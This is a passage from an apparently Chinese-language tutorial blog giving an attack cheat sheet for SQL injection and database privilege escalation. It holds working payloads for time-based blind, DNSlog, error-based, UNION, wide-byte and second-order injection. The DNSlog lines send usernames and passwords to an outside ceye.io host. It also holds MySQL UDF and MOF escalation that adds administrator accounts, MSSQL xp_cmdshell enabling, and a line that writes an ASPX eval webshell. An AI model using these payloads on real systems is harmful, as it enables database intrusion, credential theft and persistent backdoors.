:查看当前用户<br></code></pre></td></tr></table></figure><p>获取数据库总数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and sleep(if((select count(SCHEMA_NAME) from information_schema.SCHEMATA)= 7,0,5))   // 如果数据库总数等于7响应时间为0秒，如果不等于7，相应时间为5秒</span><br></code></pre></td></tr></table></figure><p>猜解当前数据库长度:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and sleep(if((length(database()) = 8),0,5))--+     //当前数据库名长度为8</span><br></code></pre></td></tr></table></figure><p>猜解当前数据库名:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and sleep(if((ORD(mid(database(),1,1)) =115 ),0,5))--+    //ascii码115 就是 s</span><br></code></pre></td></tr></table></figure><p>猜解当前数据库表的总数:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">And</span> sleep(if((注入语句),<span class="hljs-number">0</span>,<span class="hljs-number">5</span>))   <span class="hljs-operator">/</span><span class="hljs-operator">/</span>类似布尔注入推理即可 ，例如：<br><span class="hljs-string">&#x27; And sleep(if((select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()) = 2,0,5)) --+</span><br></code></pre></td></tr></table></figure><p>其他的与布尔注入类似，参考构造即可</p><ul><li>dnslog盲注<sup id="fnref:7" class="footnote-ref"><a href="#fn:7" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://www.cnblogs.com/xhds/p/12322839.html">[7]</span></a></sup></li></ul><p>如上盲注是没有回显结果的，只有靠逻辑表达式判断，那么有没有一种方式是可以使盲注有回显的呢，答案就是Dnslog盲注，如遇MySql的盲注时，可以利用内置函数load_file()来完成DNSLOG。load_file()不仅能够加载本地文件，同时也能对诸如<a href="http://www.xxx.com这样的url发起请求./">www.xxx.com这样的URL发起请求。</a> 使用DnsLog盲注仅限于windos环境。<br>其原理就是数据库将查询到的数据拼接到我们设置的域名上，然后去查看DNS解析记录就可以拿到查询到的数据。<br>构造语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> LOAD_FILE(CONCAT(<span class="hljs-string">&#x27;\\\&#x27;</span>,(<span class="hljs-keyword">select</span> database(),<span class="hljs-string">&#x27;mysql.cmr1ua.ceye.io\\abc&#x27;</span>)))  <span class="hljs-comment">-- 通过SQL语句查询内容，作为请求的一部分发送至Dnslog</span><br></code></pre></td></tr></table></figure><p>获取数据库名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and load_file(concat(&#x27;</span>\\\\<span class="hljs-string">&#x27;,(select database()),&#x27;</span>.cmr1ua.ceye.io\\abc<span class="hljs-string">&#x27;))--+</span><br></code></pre></td></tr></table></figure><p>获取数据表:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and load_file(concat(&#x27;</span>\\\\<span class="hljs-string">&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&#x27;</span>.cmr1ua.ceye.io\\abc<span class="hljs-string">&#x27;))--+</span><br></code></pre></td></tr></table></figure><p>获取表中的字段名:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and load_file(concat(&#x27;</span>\\\\<span class="hljs-string">&#x27;,(select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 0,1),&#x27;</span>.cmr1ua.ceye.io\\abc<span class="hljs-string">&#x27;))--+</span><br></code></pre></td></tr></table></figure><p>获取表中字段下的数据:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and load_file(concat(&#x27;</span>\\\\<span class="hljs-string">&#x27;,(select password from users limit 0,1),&#x27;</span>.cmr1ua.ceye.io\\abc<span class="hljs-string">&#x27;))--+</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> load_file(concat(<span class="hljs-string">&#x27;\\\\&#x27;</span>,(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;.cmr1ua.ceye.io\\abc&#x27;</span>))<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>因为在load_file里面不能使用@ ~等符号所以要区分数据我们可以先用group_ws()函数分割在用hex()函数转成十六进制即可 出来了再转回去:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and load_file(concat(&#x27;</span>\\\\<span class="hljs-string">&#x27;,(select hex(concat_ws(&#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;,username,password)) from users limit 0,1),&#x27;</span>.cmr1ua.ceye.io\\abc<span class="hljs-string">&#x27;))--+</span><br></code></pre></td></tr></table></figure><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>报错注入有时也被归类为<a href="#%E7%9B%B2%E6%B3%A8">盲注</a>，通过输入特定语句使页面报错，网页中则会输出相关错误信息，从而是我们得到想要的基本信息——数据库名、版本、用户名等。<br>报错注入又分为两种，数据库bug报错，跟数据库函数报错。<br>数据库BUG报错注入需要的函数：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">只要是count()，rand() ，group by 三个函数连用就会造成这种报错<br><span class="hljs-function"><span class="hljs-title">left</span><span class="hljs-params">(rand()</span></span>,<span class="hljs-number">3</span>)     :不一定报错<br><span class="hljs-function"><span class="hljs-title">floor</span><span class="hljs-params">(rand(<span class="hljs-number">0</span>)</span></span>*<span class="hljs-number">2</span>)    :一定报错<br><span class="hljs-function"><span class="hljs-title">round</span><span class="hljs-params">(x,d)</span></span>       :x指要处理的数，d是指保留几位小数<br><span class="hljs-function"><span class="hljs-title">concat</span><span class="hljs-params">()</span></span>         :字符串拼接<br></code></pre></td></tr></table></figure><p>函数报错注入需要的函数：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">Updatexml</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">Exp</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">Geometrycollection</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">Polygon</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">Multipoint</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">Multilinestring</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">Multipolygon</span><span class="hljs-params">()</span></span><br>等.....<br></code></pre></td></tr></table></figure><p>利用数据库bug报错注入：<br>爆数据库的两种方法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and (select concat(floor(rand(0)*2),&quot;===&quot;,(select database())) as xx,count(1) from information_schema.columns group by xx)</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> concat(<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>),&quot;===&quot;,(<span class="hljs-keyword">select</span> database())) <span class="hljs-keyword">as</span> xx,<span class="hljs-built_in">count</span>(<span class="hljs-number">1</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> xx<br></code></pre></td></tr></table></figure><p>爆表名:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; union select concat(floor(rand(0)*2),&quot;===&quot;,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 3,1)) as xx,count(1),3 from information_schema.columns group by xx--+</span><br></code></pre></td></tr></table></figure><p>爆字段：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; union select concat(floor(rand(0)*2),&quot;===&quot;,(select column_name from information_schema.columns where TABLE_SCHEMA=database() limit 8,1)) as xx,count(1),3 from information_schema.columns group by xx--+</span><br></code></pre></td></tr></table></figure><p>猜解内容：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and ORD(mid((select concat(username,&quot;-----&quot;,password) from security.users limit 0,1),1,1)) =68 %23   -- 逐个猜解内容（详情见布尔注入）</span><br></code></pre></td></tr></table></figure><p>利用特定函数报错注入的流程：<br>与利用数据库bug报错步骤相同，比如Updatexml()的注入语句如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and 1=(updatexml(1,concat(0x3a,(select database() )),1))--+</span><br></code></pre></td></tr></table></figure><h4 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h4><p>联合查询注入利用的前提条件：页面上有显示位<br>什么是显示位呢？<br>在一个在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数 据展示在页面中，这个展示数据的位置就叫显示位。<br>示例代码：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> form tp_user <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database(),<span class="hljs-number">4</span>,<span class="hljs-number">5</span>;<br></code></pre></td></tr></table></figure><h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><p>堆叠注入(stacked injections)从名词的含义就可以看到应该是一堆sql语句(多条)一起执行，而在真实的运用中也是这样的，我们知道在mysql 中，主要是命令行中，每一条语句结尾加“;”表示语句结束的，这样我们就想到了是不是可以多句一起使用就叫做堆叠注入<br>示例代码：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> form users; <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> form emails;<br></code></pre></td></tr></table></figure><h4 id="宽字节注入-8"><a href="#宽字节注入-8" class="headerlink" title="宽字节注入[8]"></a>宽字节注入<sup id="fnref:8" class="footnote-ref"><a href="#fn:8" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://cloud.tencent.com/developer/article/1920885">[8]</span></a></sup></h4><p>宽字节注入就是用宽字节去中和掉转义中加的<code>/</code>这个符号。<br></p><h5 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h5><p>在magic_quotes_gpc=On的情况下，提交的参数中如果带有单引号<code>&#39;</code>，就会被自动转义<code>\&#39;</code>，这样我们就没法闭合单引号了，</p><p>GBK双字节编码：一个汉字用两个字节表示，首字节对应<code>0×81-0xFE</code>，尾字节对应<code>0×40-0xFE</code>（除0×7F），刚好涵盖了转义符号对应的编码<code>0×5C</code>。<br><code>0xD5-0×5C</code> 对应了汉字“诚”，URL编码用百分号加字符的16进制编码表示字符，于是 <code>%d5%5c</code> 经URL解码后为“诚”。<br>下面分析攻击过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">/test.php?username=test%d5′%20or%201=1%23<br></code></pre></td></tr></table></figure><p>经过浏览器编码，username参数值为(单引号的编码0×27)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">username=test%d5%27%20or%201=1%23<br></code></pre></td></tr></table></figure><p>经过php的url解码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">username=test 0xd5 0×27 0×20 or 0×20 1=1 0×23 (为了便于阅读，在字符串与16进制编码之间加了空格)<br></code></pre></td></tr></table></figure><p>经过PHP的GPC自动转义变成(单引号0×27被转义成’对应的编码0×5c0×27)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">username=test 0xd5 0×5c 0×27 0×20 or 0×20 1=1 0×23<br></code></pre></td></tr></table></figure><p>因为在数据库初始化连接的时候SET NAMES ‘gbk’，0xd50×5c解码后为诚，0×27解码为’，0×20为空格，0×23为mysql的注释符#</p><p>上面的SQL语句最终为： </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">WHERE</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;test诚&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>#;<br></code></pre></td></tr></table></figure><p>注释符#后面的字符串已经无效，等价于</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">WHERE</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;test诚&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>条件变成永真，成功注入。</p><p>补充：</p><p>0xD50×5C不是唯一可以绕过单引号转义的字符，0×81-0xFE开头+0×5C的字符应该都可以。</p><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>二次注入是通过与数据库服务器进行交互的过程再次进行注入<br></p><h5 id="注入原理-1"><a href="#注入原理-1" class="headerlink" title="注入原理"></a>注入原理</h5><p>在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在后端代码中可能会被转义，但在存入数据库时还是原来的数据，数据中一般带有单引号和＃号，然后下次使用在拼凑SQL中，所以就形成了二次注入。</p><h3 id="按拼接位置分类"><a href="#按拼接位置分类" class="headerlink" title="按拼接位置分类"></a>按拼接位置分类</h3><p>拼接位置没什么好讲的，一笔带过就行</p><h4 id="where-注入"><a href="#where-注入" class="headerlink" title="where 注入"></a>where 注入</h4><h4 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a>order by注入</h4><h4 id="limit-注入"><a href="#limit-注入" class="headerlink" title="limit 注入"></a>limit 注入</h4><h4 id="values-注入"><a href="#values-注入" class="headerlink" title="values 注入"></a>values 注入</h4><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="MySql提权"><a href="#MySql提权" class="headerlink" title="MySql提权"></a>MySql提权</h4><p>MySql提权方式有三种：</p><h5 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h5><p>UDF（用户定义函数）是一类对MySQL服务器功能进行扩充的代码，通过添加新函数，性质就像使用本地MySQL函数abs()或concat()</p><p>前提条件：</p><ul><li>一个拥有insert和delete权限的账户</li><li>MySQL的secure_file_priv不为NULL，且目标目录本身可写</li><li>MySQL版本大于5.1时，udf.dll文件须放置于MySQL安装目录下的lib\plugin文件夹（一般需要手工创建）下</li><li>MySQL版本小于5.1时:<ul><li>Windows2000下须放置于c：\Winnt</li><li>Windows2003下须放置于c：\Windows</li></ul></li></ul><p>udf.dll&amp;udf.so 来源：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sqlmap\data\udf\mysql\linux&amp;windows <span class="hljs-comment">// 如需解码用sqlmap\extra\cloak\cloak.py解码即可</span><br>python3 cloak<span class="hljs-selector-class">.py</span> -d -<span class="hljs-selector-tag">i</span> udf<span class="hljs-selector-class">.dll_</span> - o udf<span class="hljs-selector-class">.dll</span> <span class="hljs-comment">//解码命令，so文件同理</span><br></code></pre></td></tr></table></figure><p>查看mysql有无写入权限：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%secure%&#x27;</span> <span class="hljs-comment">-- secure_file_priv的值为&#x27;&#x27;时，表示不限制权限，值为null表示不允许导入|导出</span><br></code></pre></td></tr></table></figure><p>创建/lib/plugin目录：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span>@<span class="hljs-variable">@basedir</span>;    <span class="hljs-comment">-- 查找MySQL的目录</span><br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;udf.ll&#x27;</span> <span class="hljs-keyword">into</span> dumpfile<span class="hljs-string">&#x27;C:\\Program Files\\MySQL\\MySQLServer5.1\\lib::$INDEX_ALLOCATION&#x27;</span>;    <span class="hljs-comment">-- 利用NTFS ADS创建lib目录</span><br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;udf.dll&#x27;</span> <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;C:\\Program  Files\\MySQL\\MySQLServer 5.1\\lib\\lplugin::$INDEX_ALLOCATION&#x27;</span>;    <span class="hljs-comment">-- 利用NTFS ADS创建plugin目录</span><br></code></pre></td></tr></table></figure><p>写入udf.dll文件：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> hex(load_file(<span class="hljs-string">&#x27;path\\udf.dll&#x27;</span>)) <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;mysqlpath\\lib\\plugin\\udf.dll&#x27;</span>; <span class="hljs-comment">--  windows下目录结构需要转义双写</span><br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;hexcode&#x27;</span> <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;mysqlpath\\lib\\plugin\\udf.dll&#x27;</span>;  <span class="hljs-comment">-- 或者直接写入十六进制数据</span><br></code></pre></td></tr></table></figure><p>创建自定义函数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> cmdshell <span class="hljs-keyword">returns</span> string soname <span class="hljs-string">&#x27;udf.dll&#x27;</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> mysql.func;  <span class="hljs-comment">--  查看新增的自定义函数</span><br></code></pre></td></tr></table></figure><p>执行函数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> cmdshell(<span class="hljs-string">&#x27;net user admin12 admin12 /add&#x27;</span>);<br></code></pre></td></tr></table></figure><h5 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h5><p>MOF是Windows系统的一类文件（在C:/Windows/System32/wbem/mof/nullevt.mof）叫做托管对象格式，它会每隔五秒就会去监控进程创建和死亡</p><p>提权条件：</p><ul><li>目标系统是Windows2000、WindowsXP或Windows2003</li><li>MySQL的secure_file_priv不为NULL，且目标目录本身可写</li><li>拥有MySQL数据库的root账号权限</li><li>拥有将MOF文件写入到目录“%SystemRoot%\System32\Wbem\MOF”的权限</li></ul><p>nullevt.mof 文件内容：</p><figure class="highlight vbs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs vbs">#pragma name<span class="hljs-built_in">space</span>(<span class="hljs-string">&quot;\\\\.\\root\\subscription&quot;</span>)<br><br>instance of __EventFilter as $EventFilter<br>&#123;<br>EventNamespace = <span class="hljs-string">&quot;Root\\Cimv2&quot;</span>;<br>Name = <span class="hljs-string">&quot;filtP2&quot;</span>;<br>Query = <span class="hljs-string">&quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="hljs-string">&quot;Where TargetInstance Isa \&quot;</span>Win32_LocalTime\<span class="hljs-string">&quot; &quot;</span><br><span class="hljs-string">&quot;And TargetInstance.Second = 5&quot;</span>;<br>QueryLanguage = <span class="hljs-string">&quot;WQL&quot;</span>;<br>&#125;;<br><br>instance of ActiveScriptEventConsumer as $Consumer<br>&#123;<br>Name = <span class="hljs-string">&quot;consPCSV2&quot;</span>;<br>ScriptingEngine = <span class="hljs-string">&quot;JScript&quot;</span>;<br>ScriptText =<br><span class="hljs-string">&quot;var WSH = new ActiveXObject(\&quot;</span>WScript.Shell\<span class="hljs-string">&quot;)\nWSH.run(\&quot;</span>net.exe user admin <span class="hljs-number">123456</span> /add\<span class="hljs-string">&quot;)&quot;</span>; //命令执行的地方<br>&#125;;<br><br>instance of __FilterToConsumerBinding<br>&#123;<br>Consumer = $Consumer;<br>Filter = $EventFilter;<br>&#125;;<br></code></pre></td></tr></table></figure><p>导入上传的mof文件到C:/Windows/System32/wbem/mof/nullevt.mof即可：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> load_file(<span class="hljs-string">&#x27;my.mof&#x27;</span>) <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;C:\\Windows\\System32\\wbem\\mof\\nullevt.mof&#x27;</span>;<br></code></pre></td></tr></table></figure><p>删除mof文件：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">net</span> stop winmgmt<br><span class="hljs-built_in">rmdir</span> /s /q c:\window\System32\wbem\repository<br><span class="hljs-built_in">net</span> user admin /delete<br><span class="hljs-built_in">net</span> <span class="hljs-built_in">start</span> winmgmt<br></code></pre></td></tr></table></figure><h5 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h5><p>写入开机启动项然后重启即可</p><h4 id="MSSQL提权-9"><a href="#MSSQL提权-9" class="headerlink" title="MSSQL提权[9]"></a>MSSQL提权<sup id="fnref:9" class="footnote-ref"><a href="#fn:9" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://zhuanlan.zhihu.com/p/591938680">[9]</span></a></sup></h4><h5 id="xp-cmdshell提权"><a href="#xp-cmdshell提权" class="headerlink" title="xp_cmdshell提权"></a>xp_cmdshell提权</h5><p>xp_cmdshell在低版本中默认开启，由于存在安全隐患，在sqlserver2005以后，xp_cmdshell默认关闭。利用xp_cmdshell执行系统命令</p><p>判断xp_cmdshell是否存在：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> master.dbo.sysobjects <span class="hljs-keyword">where</span> xtype<span class="hljs-operator">=</span><span class="hljs-string">&#x27;x&#x27;</span> <span class="hljs-keyword">and</span> name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>;  <span class="hljs-comment">-- 返回1即存在</span><br></code></pre></td></tr></table></figure><p>开关xp_cmdshell：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span>;RECONFIGURE;<span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span>;RECONFIGURE;  <span class="hljs-comment">-- 开启xp_cmdshell</span><br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span>;RECONFIGURE;<span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">0</span>;RECONFIGURE;  <span class="hljs-comment">-- 关闭xp_cmdshell</span><br></code></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">exec</span> master..xp_cmdshell <span class="hljs-string">&#x27;xxx&#x27;</span>   <span class="hljs-comment">--  sqlserver2019被降权为mssql权限</span><br></code></pre></td></tr></table></figure><p>写webshell：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">exec</span> master..xp_cmdshell <span class="hljs-string">&#x27;echo ^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%^&gt; &gt; c:\\WWW\\404.aspx&#x27;</span> ;<br></code></pre></td></tr></table></figure><p>xp_cmdshell被删除，需用sp_addextendedproc重新恢复或自己上传 xplog70.dll 进行恢复：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_cmdshell ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;xplog70.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_enumgroups ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;xplog70.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_loginconfig ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;xplog70.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_enumerrorlogs ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;xpstar.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_getfiledetails ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;xpstar.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc Sp_OACreate ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;odsole70.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc Sp_OADestroy ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;odsole70.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc Sp_OAGetErrorInfo ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;odsole70.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc 